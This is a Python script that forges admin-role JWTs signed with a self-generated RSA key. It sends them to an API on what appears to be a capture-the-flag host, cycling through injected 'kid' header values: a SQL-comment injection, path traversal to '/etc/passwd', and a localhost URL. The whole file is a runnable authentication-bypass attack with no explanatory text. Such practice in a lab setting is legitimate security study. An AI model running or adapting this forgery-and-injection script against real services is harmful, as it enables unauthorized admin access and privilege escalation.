import jwt # PyJWT
import requests
import json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# Generate a new RSA private key
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
priv_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

kids = [
    "primary-rs256",
    "primary-rs256'--",
    "nonexistent",
    "../",
    "/etc/passwd",
    "http://127.0.0.1/",
]

for kid in kids:
    payload = {
        "typ": "access",
        "role": "admin",
        "sub": "admin",
        "iss": "ghost-packet-auth",
        "aud": "ghost-packet-api",
        "iat": 1785015338,
        "exp": 1985017138
    }
    headers = {
        "alg": "RS256",
        "typ": "JWT",
        "kid": kid
    }
    
    token = jwt.encode(payload, priv_pem, algorithm="RS256", headers=headers)
    
    resp = requests.post(
        "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf/api/transport/bootstrap",
        headers={
            "Accept": "application/json",
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        },
        json={"clientPublicKey": {}}
    )
    print(f"kid: {repr(kid):30s} -> {resp.status_code} {resp.text}")
